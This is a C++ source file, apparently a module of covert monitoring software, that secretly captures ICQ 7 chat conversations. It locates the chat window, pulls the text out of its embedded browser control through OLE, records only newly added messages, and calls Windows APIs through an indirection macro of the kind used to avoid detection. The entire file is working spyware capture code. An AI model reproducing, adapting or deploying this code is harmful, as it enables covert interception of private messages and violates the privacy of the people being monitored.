/*
* ICQ Messenger v7.x logger
*
* Coded by: Quequero
* Date: 16/Nov/2010
*
*/

#include <exception>
#include <new>

using namespace std;

#include "QIcq7.h"
#include "..\common.h"
#define MIN_SEARCH_LENGTH 200

// XXX - DA FARE
PWCHAR QIcq7::wChatTree[] = {
	L"__oxFrame.class__",
	L"Internet Explorer_Server",
	0
};



QIcq7::QIcq7(HWND hw) : QIcq(hw)
{
	last_chat_len = 0;
	ole.Init();
	ole.SetHandle(hw);
	properties.SetHandle(hw);
	hwChat = ole.GetHandleFromClass(wChatTree);
}

QIcq7::~QIcq7()
{

}

BOOL QIcq7::GrabHistory()
{
	BSTR bChat;
	DWORD actual_len;

	if(!FNC(IsWindow)(ole.GetHandle()))
		return FALSE;
	if(hwChat == NULL)
		return FALSE;

	ole.SetHandle(hwChat);
	// Cerca di acquisire il contenuto testuale
	if(!ole.SetInterface() || !ole.GetValueFromIEContainer(&bChat) || !bChat) {
		ole.Clean();
		return FALSE;
	}

	// Al primo passaggio non prende niente per saltare tutte le schifezze scritte
	// all'inizio
	if(bFirstGrab) {
		last_chat_len = wcslen(bChat);
		properties.SetUpdated(FALSE);
		bFirstGrab = FALSE;
	} else {
		actual_len = wcslen(bChat);
		if (actual_len > last_chat_len) {
			properties.ClearHistory();
			properties.SetHistory((WCHAR *)bChat + last_chat_len);
			properties.StripLeadingReturn();
			properties.SetUpdated(TRUE);
			last_chat_len = actual_len;
		}
	}

	SAFE_SYSFREESTR(bChat);
	ole.Clean();
	return TRUE;
}

BOOL QIcq7::GrabTopic()
{
	WCHAR fake_peer[64];
	swprintf(fake_peer, 64, L"Chat ID:%08X", hwChat);
	properties.SetId(fake_peer);
	return TRUE;
}


/**
* Prende l'elenco dei partecipanti e lo mette nelle proprieta'.
*/
BOOL QIcq7::GrabUserList()
{
	properties.SetUsers(L"");
	return FALSE;
}


HWND QIcq7::GetNextChild(HWND hw, HWND hc)
{
	WCHAR wClassName[256] = {0};
	HWND hChld = hc;
	WCHAR pwClass[] = L"__oxFrame.class__";

	if(FNC(GetClassNameW)(hw, wClassName, 256) == 0)
		return NULL;
	if(wcsncmp(wClassName, pwClass, wcslen(wClassName)))
		return NULL;

	if (hChld = FNC(FindWindowExW)(hw, hChld, pwClass, NULL))
		if (hChld = FNC(FindWindowExW)(hw, hChld, pwClass, NULL))
			if (hChld = FNC(FindWindowExW)(hw, hChld, pwClass, NULL))
				return hChld;

	return NULL;
}